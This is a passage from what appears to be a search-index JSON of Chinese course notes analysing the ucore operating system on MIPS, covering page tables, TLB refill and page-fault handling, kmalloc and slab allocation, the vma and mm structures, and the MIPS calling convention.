\u4e2d\u65e0\u6548\uff0c\u5219\u9700\u8981\u6839\u636e create \u51b3\u5b9a\u662f\u5426\u521b\u5efa\u4e8c\u7ea7\u9875\u8868\u3002\uff08\u4e0b\u9762\u4ee3\u7801\u53ea\u8003\u8651\u4e86\u521b\u5efa\u60c5\u5f62\uff0c\u5e76\u4e3a\u4e86\u7a81\u51fa\u91cd\u70b9\uff0c\u5220\u51cf\u4e86\u8bb8\u591a\u6709\u7528\u7684\u4ee3\u7801\uff09</p> <pre><code>struct Page* new_pte = alloc_page();\n\nuintptr_t pa = (uintptr_t)page2kva(new_pte);\n*pdep = PADDR(pa);\n</code></pre> <p>\u6700\u540e\u4e00\u884c\uff0c\u9875\u8868\u4e2d\u5b58\u50a8\u7684\u662f\u7269\u7406\u5730\u5740\u3002\u7136\u800c\u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u6211\u4eec\u77e5\u9053\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 PADDR(pa) \u5b9e\u9645\u4e0a\u662f\u865a\u62df\u5730\u5740\u3002\u7136\u800c\u6211\u4eec\u53d1\u73b0\u5728\u8fd9\u6837\u8bbe\u7f6e\u4e4b\u540e\uff0c\u4e0b\u6b21\u8c03\u7528 get_pte \u65f6\uff0c\u83b7\u5f97\u7684 pte \u7684\u5730\u5740\u786e\u5b9e\u662f\u865a\u62df\u5730\u5740\uff08KADDR \u4e0d\u4ea7\u751f\u4f5c\u7528\uff09\u3002</p> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page_insert","title":"page_insert","text":"<pre><code>int page_insert(pde_t *pgdir, struct Page *page, uintptr_t la, uint32_t perm)\n</code></pre> <p>\u4f5c\u7528\uff1a\u5c06\u865a\u62df\u5730\u5740 la \u6620\u5c04\u5230 page \u5bf9\u5e94\u7684\u7269\u7406\u9875\u4e0a</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u6839\u636e\u865a\u62df\u5730\u5740 la \u67e5\u627e\u5230\u4e8c\u7ea7\u9875\u8868\u9879 ptep</p> </li> <li> <p>\u5982\u679c\u539f\u672c ptep \u5df2\u7ecf\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u7269\u7406\u9875\u4e0a\u4e86\uff0c\u5219\u5220\u9664\u8be5\u6620\u5c04\uff08\u6709\u53ef\u80fd\u5bfc\u81f4\u56de\u6536\u7269\u7406\u9875\uff09</p> </li> <li> <p>\u8bbe\u7f6e ptep \u6620\u5c04\u5230\u65b0\u7269\u7406\u9875</p> <pre><code>*ptep = page2pa(page) | PTE_P | perm;\n</code></pre> <p>\u7531\u4ee5\u4e0a\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u4e8c\u7ea7\u9875\u8868\u9879\u4e2d\u5b58\u50a8\u7684\u5730\u5740\u5176\u5b9e\u662f\u865a\u62df\u5730\u5740\u3002</p> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page_remove","title":"page_remove","text":"<pre><code>void page_remove(pde_t *pgdir, uintptr_t la) {\n</code></pre> <p>\u4f5c\u7528\uff1a\u89e3\u9664 pgdir \u4e2d\u865a\u62df\u5730\u5740 la \u7684\u6620\u5c04</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u83b7\u5f97 pte</p> <pre><code>pte_t *ptep = get_pte(pgdir, la, 0);\n</code></pre> </li> <li> <p>\u5982\u679c<code>ptep != NULL</code>\u4e14<code>*ptep &amp; PTE_P</code>\uff0c</p> <pre><code>struct Page *page = pte2page(*ptep);\npage_ref_dec(page);\n// and free it when reach 0\nif(page_ref(page) == 0){\n    free_page(page);\n}\n</code></pre> </li> <li> <p>\u6e05\u9664\u6620\u5c04</p> <pre><code>*ptep = 0;\n</code></pre> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pgdir_alloc_page","title":"pgdir_alloc_page","text":"<pre><code>struct Page * pgdir_alloc_page(pde_t *pgdir, uintptr_t la, uint32_t perm)\n</code></pre> <p>\u4f5c\u7528\uff1a\u8be5\u51fd\u6570\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5c06 la \u5bf9\u5e94\u7684\u865a\u62df\u9875\uff0c\u6620\u5c04\u5230\u8be5\u7269\u7406\u9875</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check","title":"check","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_pgdir","title":"check_pgdir","text":"<ol> <li>\u5c06\u865a\u62df\u5730\u5740 0x0 \u6620\u5c04\u5230\u4e00\u4e2a\u7269\u7406\u9875 (\u968f\u4fbf\u5206\u914d\u4e00\u4e2a page, p1) \u4e0a\u3002</li> <li>\u5c06\u865a\u62df\u5730\u5740 0x1000(PAGESIZE) \u6620\u5c04\u5230\u4e00\u4e2a\u7269\u7406\u9875 (\u968f\u4fbf\u5206\u914d\u4e00\u4e2a page, p2)\u3002</li> <li>\u5c06 0x1000 \u91cd\u65b0\u6620\u5c04\u5230 p1.    ......    \u4e3b\u8981\u662f\u68c0\u67e5\u4e86 page_insert, page_remove \u7b49\u51fd\u6570\u7684\u6b63\u786e\u6027\u3002</li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_boot_pgdirtlb-refill-\u5904\u7406","title":"check_boot_pgdir\uff08tlb refill \u5904\u7406)","text":"<ol> <li> <p>\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5199\u5165\u521d\u59cb\u503c</p> <pre><code>struct Page *p;\np = alloc_page();\n*(int*)(page2kva(p) + 0x100) = 0x1234;\n</code></pre> </li> <li> <p>\u5c06\u4e24\u4e2a\u865a\u62df\u9875\u6620\u5c04\u5230\u8be5\u7269\u7406\u9875\u4e0a</p> <pre><code>assert(page_insert(boot_pgdir, p, 0x100, PTE_W) == 0);\nassert(page_ref(p) == 1);\nassert(page_insert(boot_pgdir, p, 0x100 + PGSIZE, PTE_W) == 0);\nassert(page_ref(p) == 2);\n</code></pre> </li> <li> <p>\u76f4\u63a5\u4f7f\u7528\u865a\u62df\u5730\u5740\u8bbf\u95ee\u8be5\u7269\u7406\u9875\uff0c\u5f15\u53d1 tlb refill \u5f02\u5e38</p> <pre><code>assert(*(int*)0x100 == 0x1234);\n</code></pre> </li> <li> <p>\u8fdb\u5165\u5bf9\u5e94\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f</p> <pre><code>static void handle_tlbmiss(struct trapframe* tf, int write)\n{\n  int in_kernel = trap_in_kernel(tf);\n  assert(current_pgdir != NULL);\n  uint32_t badaddr = tf-&gt;tf_vaddr;\n  int ret = 0;\n  pte_t *pte = get_pte(current_pgdir, tf-&gt;tf_vaddr, 0);\n  if(pte==NULL || ptep_invalid(pte)){   //PTE miss, pgfault\n      kprintf(\"## pagefault in kernel, badaddr: 0x%x\\n\", badaddr);\n    //tlb will not be refill in do_pgfault,\n    //so a vmm pgfault will trigger 2 exception\n    //permission check in tlb miss\n    ret = pgfault_handler(tf, badaddr, get_error_code(write, pte));\n  }else{ //tlb miss only, reload it\n    /* refill two slot */\n    /* check permission */\n    if(in_kernel){\n      kprintf(\"## tlb refill in kernel, badaddr: 0x%x\\n\", badaddr);\n      tlb_refill(badaddr, pte); \n      return;\n    }else{\n      if(!ptep_u_read(pte)){\n        ret = -1;\n        goto exit;\n      }\n      if(write &amp;&amp; !ptep_u_write(pte)){\n        ret = -2;\n        goto exit;\n      }\n    //kprintf(\"## refill U %d %08x\\n\", write, badaddr);\n      tlb_refill(badaddr, pte);\n      return ;\n    }\n  }\n\nexit:\n  if(ret){\n    print_trapframe(tf);\n    if(in_kernel){\n      panic(\"unhandled pgfault\");\n    }else{\n      do_exit(-E_KILLED);\n    }\n  }\n  return ;\n}\n</code></pre> <ol> <li> <p>\u9996\u5148\u5224\u65ad\u662f\u5426\u5728\u5185\u6838\u4e2d\u53d1\u751f\u4e86\u5f02\u5e38\uff0c\u8fd9\u91cc\u901a\u8fc7 Status.KSU \u4f4d\u6765\u5224\u65ad\uff0c2'b00 \u8868\u793a kernel mode\uff0c2'b10 \u8868\u793a user mode\u3002</p> <pre><code>bool\ntrap_in_kernel(struct trapframe *tf) {\n  return !(tf-&gt;tf_status &amp; KSU_USER);\n}\n</code></pre> </li> <li> <p>\u7136\u540e\u83b7\u5f97 pte</p> <pre><code>pte_t *pte = get_pte(current_pgdir, tf-&gt;tf_vaddr, 0);\n</code></pre> </li> <li> <p>\u4e4b\u540e\u8fdb\u5165 tlb_refill \u51fd\u6570\uff0ctlb_refill \u6267\u884c tlbwr\uff0c\u4ece pte \u8bfb\u53d6\u6620\u5c04\u7684\u7269\u7406\u9875\u53f7\u5199\u5165\u5230 tlb \u9879\u4e2d\u3002\uff08\u4e00\u6b21\u6620\u5c04\u4e24\u9875\uff09</p> <pre><code>tlb_replace_random(0, badaddr &amp; THUMIPS_TLB_ENTRYH_VPN2_MASK, \n      pte2tlblow(*pte), pte2tlblow(*(pte+1)));\n</code></pre> </li> </ol> </li> </ol> <p>\u7ec8\u7aef\u8f93\u51fa</p> <pre><code>## tlb refill in kernel, badaddr: 0x100\ncheck_boot_pgdir() succeeded!\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kmalloc","title":"kmalloc","text":"<p>pmm_init \u4e2d\u8fd8\u8c03\u7528\u4e86 kmalloc_init\u3002</p> <p>kmalloc \u4e2d\u4e3b\u8981\u5b9e\u73b0\u4e86\u4ee5\u4e0b\u5173\u952e\u51fd\u6570</p> <pre><code>void *kmalloc(size_t n);\nvoid kfree(void *objp);\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 kmalloc \u51fd\u6570\u7684\u53c2\u6570\u4e3a\u5b57\u8282\u6570\uff0c\u8fd4\u56de\u503c\u4e3a\u5206\u914d\u7684\u7269\u7406\u5185\u5b58\u7684\u865a\u62df\u8d77\u59cb\u5730\u5740\u3002</p> <p>kmalloc \u5229\u7528\u5230\u4e86 slab \u673a\u5236</p> <p>slab \u662f Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u79cd\u5185\u5b58\u5206\u914d\u673a\u5236\u3002\u5176\u5de5\u4f5c\u662f\u9488\u5bf9\u4e00\u4e9b\u7ecf\u5e38\u5206\u914d\u5e76\u91ca\u653e\u7684\u5bf9\u8c61\uff0c\u5982\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u7b49\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u7684\u5927\u5c0f\u4e00\u822c\u6bd4\u8f83\u5c0f\uff0c\u5982\u679c\u76f4\u63a5\u91c7\u7528\u4f19\u4f34\u7cfb\u7edf\u6765\u8fdb\u884c\u5206\u914d\u548c\u91ca\u653e\uff0c\u4e0d\u4ec5\u4f1a\u9020\u6210\u5927\u91cf\u7684\u5185\u5b58\u788e\u7247\uff0c\u800c\u4e14\u5904\u7406\u901f\u5ea6\u4e5f\u592a\u6162\u3002\u800c slab \u5206\u914d\u5668\u662f\u57fa\u4e8e\u5bf9\u8c61\u8fdb\u884c\u7ba1\u7406\u7684\uff0c\u76f8\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u5f52\u4e3a\u4e00\u7c7b (\u5982\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u5c31\u662f\u4e00\u7c7b)\uff0c\u6bcf\u5f53\u8981\u7533\u8bf7\u8fd9\u6837\u4e00\u4e2a\u5bf9\u8c61\uff0cslab \u5206\u914d\u5668\u5c31\u4ece\u4e00\u4e2a slab \u5217\u8868\u4e2d\u5206\u914d\u4e00\u4e2a\u8fd9\u6837\u5927\u5c0f\u7684\u5355\u5143\u51fa\u53bb\uff0c\u800c\u5f53\u8981\u91ca\u653e\u65f6\uff0c\u5c06\u5176\u91cd\u65b0\u4fdd\u5b58\u5728\u8be5\u5217\u8868\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u8fd4\u56de\u7ed9\u4f19\u4f34\u7cfb\u7edf\uff0c\u4ece\u800c\u907f\u514d\u8fd9\u4e9b\u5185\u788e\u7247\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#vmm_init","title":"vmm_init","text":"<p>\u901a\u8fc7\u5185\u5b58\u5730\u5740\u865a\u62df\u5316\uff0c\u53ef\u4ee5\u4f7f\u5f97\u8f6f\u4ef6\u5728\u6ca1\u6709\u8bbf\u95ee\u67d0\u865a\u62df\u5185\u5b58\u5730\u5740\u65f6\uf967\u5206\u914d\u5177\u4f53\u7684\u7269\u7406\uf9e4\u5185\u5b58\uff0c\u800c\u53ea\u6709\u5728\u5b9e\u9645\u8bbf\u95ee\u67d0\u865a\u62df\u5185\u5b58\u5730\u5740\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u518d\u52a8\u6001\u5730\u5206\u914d\u7269\uf9e4\u5185\u5b58\uff0c\u5efa\u7acb\u865a\u62df\u5185\u5b58\u5230\u7269\u7406\uf9e4\u5185\u5b58\u7684\u9875\u6620\u5c04\u5173\u7cfb\uff0c\u8fd9\u79cd\u6280\u672f\u79f0\u4e3a\u6309\u9700\u5206\u9875\uff08demand paging\uff09\u3002\u628a\u4e0d\uf967\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u6240\u5360\u7684\u5185\u5b58\u7a7a\u95f4\u4e34\u65f6\u5199\u5230\u786c\u76d8\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u817e\u51fa\u66f4\uf901\u591a\u7684\u7a7a\u95f2\u5185\u5b58\u7a7a\u95f4 \u7ed9\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\uff1b\u5f53 CPU \u8bbf\u95ee\u5230\u4e0d\uf967\u7ecf\u5e38\u8bbf\u95ee\u7684\u6570\u636e\u65f6\uff0c\u518d\u628a\u8fd9\u4e9b\u6570\u636e\u4ece\u786c\u76d8\u8bfb\u5165\u5230\u5185\u5b58\u4e2d\u3002\u8fd9\u79cd\u6280\u672f\u79f0\u4e3a\u9875\u6362\u5165\u6362\u51fa (page in/out)</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#vma_struct","title":"vma_struct","text":"<p>vma \u7528\u4e8e\u63cf\u8ff0\u8fdb\u7a0b\u5bf9\u865a\u62df\u5185\u5b58\u7684\u9700\u6c42</p> <pre><code>struct vma_struct {\n    struct mm_struct *vm_mm; // the set of vma using the same PDT \n    uintptr_t vm_start;      // start addr of vma \n    uintptr_t vm_end;        // end addr of vma\n    uint32_t vm_flags;       // flags of vma\n    list_entry_t list_link;  // linear list link which sorted by start addr of vma\n};\n</code></pre> <p>vma \u6307\u793a\u4e86\u4e00\u6bb5\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff0c\u4e0d\u540c vma \u901a\u8fc7 list_link \u76f8\u8fde\uff0c\u5171\u540c\u8868\u793a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#mm_struct","title":"mm_struct","text":"<pre><code>struct mm_struct {\n    list_entry_t mmap_list;        // linear list link which sorted by start addr of vma\n    struct vma_struct *mmap_cache; // current accessed vma, used for speed purpose\n    pde_t *pgdir;                  // the PDT of these vma\n    int map_count;                 // the count of these vma\n void *sm_priv;       // the private data for swap manager\n atomic_t mm_count;\n semaphore_t mm_sem;\n int locked_by;\n};\n</code></pre> <p>mm_struct \u7528\u4e8e\u7ba1\u7406\u4e00\u7cfb\u5217\u4f7f\u7528\u540c\u4e00\u4e2a\u9875\u76ee\u5f55\u8868\u7684 vma \u7684\u96c6\u5408\u3002</p> <p>\u8fdb\u7a0b\u63a7\u5236\u5757\u4e2d\u5305\u542b\u4e00\u4e2a mm_struct \u7684\u6307\u9488\uff0c\u7528\u4e8e\u7ba1\u7406\u8be5\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u5173\u952e\u51fd\u6570","title":"\u5173\u952e\u51fd\u6570","text":"<pre><code>struct vma_struct *find_vma(struct mm_struct *mm, uintptr_t addr);\nstruct vma_struct *vma_create(uintptr_t vm_start, uintptr_t vm_end, uint32_t vm_flags);\nvoid insert_vma_struct(struct mm_struct *mm, struct vma_struct *vma);\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_pgfaultpagefault-\u7684\u5904\u7406","title":"check_pgfault\uff08pagefault \u7684\u5904\u7406\uff09","text":"<ol> <li> <p>\u521b\u5efa mm_struct</p> <pre><code>check_mm_struct = mm_create();\n</code></pre> <p>\u8fd9\u91cc\u7684<code>check_mm_struct</code>\u4e3a\u5168\u5c40\u53d8\u91cf</p> </li> <li> <p>\u5206\u914d[0, PTSIZE]\u7684\u865a\u62df\u5185\u5b58</p> <pre><code>struct vma_struct *vma = vma_create(0, PTSIZE, VM_WRITE); //\u5982\u679c\u8be5\u6210 VM_READ\uff0c\u4e4b\u540e\u5728 do_pgfault \u4fbf\u4f1a\u901a\u4e0d\u8fc7\u6743\u9650\u68c0\u67e5\u3002\ninsert_vma_struct(mm, vma);\n</code></pre> </li> <li> <p>\u8bbf\u95ee 0x100</p> <pre><code>  uintptr_t addr = 0x100;\n  assert(find_vma(mm, addr) == vma);\n\n  int i, sum = 0;\n  for (i = 0; i &lt; 100; i ++) {\n    *(char *)(addr + i) = i;    //page fault\n    sum += i;\n  }\n  for (i = 0; i &lt; 100; i ++) {\n    sum -= *(char *)(addr + i);\n  }\n  assert(sum == 0);\n</code></pre> </li> <li> <p>\u89e6\u53d1 tlb refill \u5f02\u5e38\u3002\uff08\u5b9e\u9645\u4e3a pagefault\uff0c\u6b64\u65f6\u9875\u8868\u4e2d\u6ca1\u6709\u8be5\u6620\u5c04\uff0c\u56e0\u6b64 tlb \u4e2d\u4e5f\u6ca1\u6709\u8be5\u9879\uff09</p> <p>\u53c2\u8003\u4e4b\u524d tlb refill \u5f02\u5e38\u5904\u7406\u7684\u4ee3\u7801\uff0c\u8fdb\u5165 pgfault_handler</p> <p>1. \u9996\u5148\u901a\u8fc7\u5224\u65ad check_mm_struct \u975e\u7a7a\uff0c\u77e5\u9053\u662f\u5728\u6267\u884c check_pgfault \u51fd\u6570\uff0c\u5c06 mm \u8bbe\u7f6e\u4e3a check_mm_struct   2. \u5728 do_pgfault \u4e2d\u9996\u5148\u8c03\u7528 find_vma \u51fd\u6570\uff0c\u786e\u5b9a\u8be5\u865a\u62df\u5730\u5740\u662f\u6709\u6548\u7684   3. \u7136\u540e\u68c0\u67e5\u8be5\u5730\u5740\u8bbf\u95ee\u6743\u9650\u662f\u5426\u6b63\u786e\uff08\u5982\u679c\u5c06   4. \u90fd\u901a\u8fc7\u4e86\u540e\uff0c\u8c03\u7528 pgdir_alloc_page\uff0c\u76f4\u63a5\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5728 mm-&gt;pgdir \u4e2d\u63d2\u5165\u6620\u5c04\u5173\u7cfb\u3002   5. \u5f02\u5e38\u5904\u7406\u5b8c\u6210\u5e76\u8fd4\u56de</p> </li> <li> <p>\u518d\u6b21\u89e6\u53d1 tlb refill \u5f02\u5e38\u3002\uff08\u73b0\u5728\u9875\u8868\u4e2d\u5b58\u5728\u4e86\u8be5\u6620\u5c04\uff0c\u56e0\u6b64\u8fdb\u5165 tlb_refill \u51fd\u6570\uff09</p> </li> </ol> <p>\u7ec8\u7aef\u8f93\u51fa</p> <pre><code>## pagefault in kernel, badaddr: 0x100\n## tlb refill in kernel, badaddr: 0x100\ncheck_pgfault() succeeded!\n</code></pre> <p>\u4ee3\u7801</p> <pre><code>static inline int get_error_code(int write, pte_t *pte)\n{\n  int r = 0;\n  if(pte!=NULL &amp;&amp; ptep_present(pte)) //\u56e0\u4e3a pagefault \u7684\u6761\u4ef6 (pte==NULL || ptep_invalid(pte))\uff0c\u8fd9\u91cc\u6839\u672c\u4e0d\u53ef\u80fd\u4e3a\u771f\n    r |= 0x01;\n  if(write)\n    r |= 0x02;\n  return r;\n}\n</code></pre> <pre><code>static int\npgfault_handler(struct trapframe *tf, uint32_t addr, uint32_t error_code) {\n  extern struct mm_struct *check_mm_struct;\n  struct mm_struct *mm;\n  if (check_mm_struct != NULL) {\n    assert(current == NULL);\n    mm = check_mm_struct;\n  }\n  else {\n    if (current == NULL) {\n      print_trapframe(tf);\n      //print_pgfault(tf);\n      panic(\"unhandled page fault.\\n\");\n    }\n    mm = current-&gt;mm;\n  }\n  return do_pgfault(mm, error_code, addr);\n}\n</code></pre> <pre><code>#! vmm.c\n\n//page fault number\nvolatile unsigned int pgfault_num=0;\n// do_pgfault - interrupt handler to process the page fault execption\nint\ndo_pgfault(struct mm_struct *mm, uint32_t error_code, uintptr_t addr) {\n  int ret = -E_INVAL;\n  struct vma_struct *vma = find_vma(mm, addr);\n  //kprintf(\"## %08x %08x\\n\", error_code, addr);\n\n  pgfault_num++;\n  if (vma == NULL || vma-&gt;vm_start &gt; addr) {\n    kprintf(\"not valid addr %x, and  can not find it in vma\\n\", addr);\n    goto failed;\n  }\n\n  switch (error_code &amp; 3) {\n    default:\n      /* default is 3: write, present */\n    case 2: /* write, not present */\n      if (!(vma-&gt;vm_flags &amp; VM_WRITE)) {\n        kprintf(\"write, not present in do_pgfault failed\\n\");\n        goto failed;\n      }\n      break;\n    case 1: /* read, present */\n      kprintf(\"read, present in do_pgfault failed\\n\");\n      goto failed;\n    case 0: /* read, not present */\n      if (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) {\n        kprintf(\"read, not present in do_pgfault failed\\n\");\n        goto failed;\n      }\n  }\n\n  uint32_t perm = PTE_U;\n  if (vma-&gt;vm_flags &amp; VM_WRITE) {\n    perm |= PTE_W;\n  }\n  addr = ROUNDDOWN_2N(addr, PGSHIFT);\n\n  ret = -E_NO_MEM;\n\n  // try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT.\n  pte_t *ptep=NULL;\n  if ((ptep = get_pte(mm-&gt;pgdir, addr, 1)) == NULL) {\n    goto failed;\n  }\n\n  if (*ptep == 0) { // if the phy addr isn't exist, then alloc a page &amp; map the phy addr with logical addr\n    if (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == NULL) {\n      goto failed;\n    }\n  }\n  else { // if this pte is a swap entry, then load data from disk to a page with phy addr, \n    // map the phy addr with logical addr, trig swap manager to record the access situation of this page\n    if(swap_init_ok) {\n      panic(\"No swap!! never reach!!\"); \n    }\n    else {\n      kprintf(\"no swap_init_ok but ptep is %x, failed\\n\",*ptep);\n      goto failed;\n    }\n  }\n  /* refill TLB for mips, no second exception */\n  //tlb_refill(addr, ptep);\n  ret = 0;\nfailed:\n  return ret;\n}\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<ol> <li> <p>\u4f7f\u7528 jal \u8c03\u7528\u51fd\u6570\uff0c\u4f7f\u7528 jr ra \u8fd4\u56de\u3002\u4f7f\u7528 a0-a3 \u4f20\u9012\u53c2\u6570\uff0c\u4f7f\u7528 v0-v1 \u4f20\u9012\u8fd4\u56de\u503c\u3002\u5bf9\u4e8e\u66f4\u591a\u7684\u53c2\u6570\uff0c\u4f7f\u7528\u6808\u4f20\u9012\u3002</p> </li> <li> <p>\u4e3a\u4e86\u9632\u6b62\u5bc4\u5b58\u5668\u7684\u503c\u88ab\u8986\u76d6\u3002\u9700\u8981\u5728\u5b58\u50a8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ef\u4ee5\u7531 caller \u6216\u8005 callee \u6765\u5b8c\u6210\u3002\u4f46\u662f\u53ea\u6709\u4e00\u65b9\u5b8c\u6210\u65f6\uff0c\u56e0\u4e3a caller \u4e0d\u77e5\u9053 callee \u4f1a\u7528\u54ea\u4e9b\u5bc4\u5b58\u5668\uff0c\u6216\u8005 callee \u4e0d\u77e5\u9053 caller \u9700\u8981\u7528\u54ea\u4e9b\u5bc4\u5b58\u5668\u3002\u56e0\u6b64\u5c31\u4f1a\u5bfc\u81f4\u5b58\u50a8\u4e0d\u5fc5\u8981\u7684\u5bc4\u5b58\u5668\u3002MIPS \u91c7\u7528\u4e86\u4e00\u79cd\u6298\u8877\u7684\u7b56\u7565\uff0c\u5c06\u5bc4\u5b58\u5668\u5206\u4e3a caller-save\uff08\u5982 t0-t7, a0-a3, v0-v1\uff09\u548c callee-save\uff08\u5982 s0-s7, ra\uff09</p> </li> <li> <p>fp \u5bc4\u5b58\u5668\uff08\u4e5f\u662f s8\uff09\u7528\u4e8e\u6307\u5411\u6808\u5e27\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002\u56e0\u4e3a x86 \u4e2d\u63d0\u4f9b\u4e86 push \u548c pop \u6307\u4ee4\uff0csp \u7684\u4f4d\u7f6e\u662f\u53d8\u5316\u7684\uff0c\u8981\u5f15\u7528\u4e0d\u540c\u53d8\u91cf\u7684\u503c\u662f\u7528 fp \u66f4\u65b9\u4fbf\u3002\u800c MIPS \u4e2d\u5219\u662f\u5728\u51fd\u6570\u7684\u5f00\u5934\u624b\u52a8\u5c06 sp \u8bbe\u7f6e\uff0csp \u4e4b\u540e\u7684\u503c\u4e0d\u4f1a\u53d8\u5316\uff0c\u56e0\u6b64 fp \u8c8c\u4f3c\u4f5c\u7528\u4e0d\u5927\u3002</p> </li> <li> <p>gp \u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u7a0b\u5e8f\u8bbf\u95ee\u5168\u5c40\u53d8\u91cf\uff08\u6bd4\u5982\u51fd\u6570\u7684\u5730\u5740\uff09\u3002</p> <p>ps. \u4f7f\u7528 mipsel-linux-gnu-gcc -S \u7f16\u8bd1\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u8c03\u7528\u6d4b\u8bd5\u4ee3\u7801\u3002\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u548c\u4e0a\u9762\u8bb2\u7684 caller-save\uff0ccallee-save \u5bf9\u4e0d\u4e0a\u3002\u6bd4\u5982\u51fd\u6570\u5f00\u5934<code>addiu $sp,$sp,-40</code>\uff0c\u4f46\u7ed3\u679c\u5374\u6839\u672c\u6ca1\u7528\u4e0a\u8fd9\u4e48\u5927\u7684\u7a7a\u95f4\u3002\u7136\u540e\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u4f1a\u51fa\u73b0<code>sw $a0,40($fp)</code>\uff0c\u5373\u5c06\u53c2\u6570<code>a0</code>\u5199\u5165\u7236\u51fd\u6570\u6808\u5e27\u7684\u60c5\u51b5\u3002\uff08\u8fd9\u4e2a\u7136\u540e fp \u548c sp \u59cb\u7ec8\u76f8\u7b49\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8981\u53bb\u5b58\u50a8 fp</p> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#sched_init--proc_init","title":"sched_init &amp; proc_init","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#proc_struct\u8fdb\u7a0b\u63a7\u5236\u5757","title":"proc_struct(\u8fdb\u7a0b\u63a7\u5236\u5757)","text":"<pre><code>struct proc_struct {\n    enum proc_state state;                      // Process state\n    int pid;                                    // 